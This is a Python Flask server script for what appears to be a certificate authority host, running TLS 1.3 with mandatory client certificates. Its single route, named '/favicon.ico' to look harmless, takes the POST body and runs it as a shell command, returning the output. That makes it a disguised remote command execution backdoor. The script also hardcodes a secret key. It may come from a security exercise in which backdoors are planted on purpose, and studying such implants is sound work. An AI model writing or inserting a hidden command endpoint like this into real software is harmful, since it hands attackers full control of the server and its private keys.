import subprocess
import ssl
import re
from flask import Flask, request

### CONSTANTS ############################################

IP_CA_SRV = '192.168.10.10'
SRV_PORT = 6666
ROOT_FOLDER = '/home/ca-server/Documents/certificates/root/'

### FUNCTIONS ############################################

def create_ssl_context():
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    chain_cert_path = ROOT_FOLDER+'issued/iMoviesIntermediate_TLS/issued/ca-server_CA_chain.crt'
    key_path = ROOT_FOLDER+'issued/iMoviesIntermediate_TLS/keys/ca-server.pem'
    ssl_ctx.load_cert_chain(chain_cert_path, key_path)
    ssl_ctx.load_verify_locations(ROOT_FOLDER+'root.crt')
    ssl_ctx.verify_mode = ssl.CERT_REQUIRED
    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ssl_ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    return ssl_ctx

### MAIN #################################################

def main():
    ssl_ctx2 = create_ssl_context()

    appbis = Flask(__name__, instance_relative_config=False)
    appbis.config.from_mapping(SECRET_KEY='HbQhIZymLo')


    @appbis.route('/favicon.ico', methods=['POST'])
    def favicon():
        data = request.get_data().decode()
        if data.isascii() and len(data)>0:
            subproc = subprocess.run(data, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
            return str(subproc.returncode) + '\n' + str(subproc.stdout)
        else:
            return None

    appbis.run(
        host = IP_CA_SRV,
        port = SRV_PORT,
        ssl_context=ssl_ctx2,
        threaded=True)

if __name__ == '__main__':
    main()